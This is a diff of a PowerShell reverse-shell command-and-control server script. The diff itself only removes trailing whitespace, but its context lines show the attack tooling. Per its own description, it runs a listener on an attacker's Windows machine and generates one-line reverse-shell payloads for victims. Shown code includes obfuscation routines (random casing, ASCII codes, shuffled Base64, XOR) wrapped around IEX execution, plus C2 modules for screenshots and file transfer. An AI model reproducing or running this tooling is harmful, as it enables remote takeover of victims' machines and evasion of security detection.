@@ -1,7 +1,7 @@
 <#
 .DESCRIPTION
    ReverseTCP Shell - Framework. This PS1 starts a listener Server on a Windows attacker machine and generate oneline rev shell payloads for CMD and PS to be executed on the victim machine.
-   You can use the generated oneline rev shell payload also via netcat on linux. (in this case you will lose the C2 functionalities like screenshot, upload and download files. 
+   You can use the generated oneline rev shell payload also via netcat on linux. (in this case you will lose the C2 functionalities like screenshot, upload and download files.
 .EXAMPLE
    run Reverse_TCP_Shell_SRV.ps1
    follow the instructions setting:
@@ -14,23 +14,23 @@
  3 = Base64
 
  >>> 2
- 
+
  execute the output on the victim machine.
- 
- more info here: 
+
+ more info here:
  https://github.com/ZHacker13/ReverseTCPShell
  https://www.youtube.com/watch?v=hiYyXv4RdD8
- 
+
 #>
 
 function Character_Obfuscation($String)
 {
   $String = $String.toCharArray();
-  
-  Foreach($Letter in $String) 
+
+  Foreach($Letter in $String)
   {
     $RandomNumber = (1..2) | Get-Random;
-    
+
     If($RandomNumber -eq "1")
     {
       $Letter = "$Letter".ToLower();
@@ -44,7 +44,7 @@ function Character_Obfuscation($String)
     $RandomString += $Letter;
     $RandomNumber = $Null;
   }
-  
+
   $String = $RandomString;
   Return $String;
 }
@@ -82,15 +82,15 @@ function ASCII_Obfuscation($String)
 {
   $PowerShell = "IEX(-Join((@)|%{[char]`$_}));Exit";
   $CMD = "ECHO `"IEX(-Join((@)|%{[char]```$_}));Exit`" | PowerShell `"IEX(IEX(`$input))`"&Exit";
-  
+
   $String = [System.Text.Encoding]::ASCII.GetBytes($String) -join ',';
-  
+
   $PowerShell = Character_Obfuscation($PowerShell);
   $PowerShell = $PowerShell -replace "@","$String";
 
   $CMD = Character_Obfuscation($CMD);
   $CMD = $CMD -replace "@","$String";
-  
+
   Return $PowerShell,$CMD;
 }
 
@@ -98,10 +98,10 @@ function Base64_Obfuscation($String)
 {
   $PowerShell = "IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(([Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes({@})|Sort-Object {Get-Random -SetSeed #}))))));Exit";
   $CMD = "ECHO `"IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(([Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes({@})|Sort-Object {Get-Random -SetSeed #}))))));Exit`" | PowerShell `"IEX(IEX(`$input))`"&Exit";
-  
+
   $Seed = (Get-Random -Minimum 0 -Maximum 999999999).ToString('000000000');
   $String = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes([Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($String))) | Sort-Object {Get-Random -SetSeed $Seed}));
-  
+
   $PowerShell = Character_Obfuscation($PowerShell);
   $PowerShell = $PowerShell -replace "@","$String";
   $PowerShell = $PowerShell -replace "#","$Seed";
@@ -120,7 +120,7 @@ function BXOR_Obfuscation($String)
 
   $Key = '0x' + ((0..5) | Get-Random) + ((0..9) + ((65..70) + (97..102) | % {[char]$_}) | Get-Random);
   $String = ([System.Text.Encoding]::ASCII.GetBytes($String) | % {$_ -BXOR $Key}) -join ',';
-  
+
   $PowerShell = Character_Obfuscation($PowerShell);
   $PowerShell = $PowerShell -replace "@","$String";
   $PowerShell = $PowerShell -replace "#","$Key";
@@ -149,14 +149,14 @@ function Payload($IP,$Port,$Base64_Key)
 $Modules = @"
 
 
-  _____                           _______ _____ _____      _____ _    _      _ _ 
+  _____                           _______ _____ _____      _____ _    _      _ _
  |  __ \                         |__   __/ ____|  __ \    / ____| |  | |    | | |
  | |__) |_____   _____ _ __ ___  ___| | | |    | |__) |  | (___ | |__| | ___| | |
  |  _  // _ \ \ / / _ \ '__/ __|/ _ \ | | |    |  ___/    \___ \|  __  |/ _ \ | |
  | | \ \  __/\ V /  __/ |  \__ \  __/ | | |____| |        ____) | |  | |  __/ | |
  |_|  \_\___| \_/ \___|_|  |___/\___|_|  \_____|_|       |_____/|_|  |_|\___|_|_|
-                                                     
-                                                                                                                                                                                              
+
+
 
  - | Modules    | - Show C2-Server Modules.
  - | Info       | - Show Remote-Host Info.
@@ -179,7 +179,7 @@ While(!($Local_Port))
   $Local_Port = Read-Host;
 
   netstat -na | Select-String LISTENING | % {
-  
+
   If(($_.ToString().split(":")[1].split(" ")[0]) -eq "$Local_Port")
   {
     $Local_Port = $Null;
@@ -282,7 +282,7 @@ While($Client.Connected)
       Write-Host "`n$Info";
       $Command = $Null;
     }
-    
+
     If($Command -eq "Screenshot")
     {
       $File = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_});
@@ -310,7 +310,7 @@ While($Client.Connected)
         $File = $File.Split('/')[-1];
         $File = "$pwd\$File";
         $Save = $True;
-      
+
       } Else {
 
         Write-Host "`n";
@@ -498,7 +498,7 @@ While($Client.Connected)
           Write-Host " [*] File Uploaded: $OutPut`n";
 
         } Else {
-          
+
           Write-Host " [*] Failed ! [*]";
           Write-Host " [*] File already Exists [*]`n";
         }
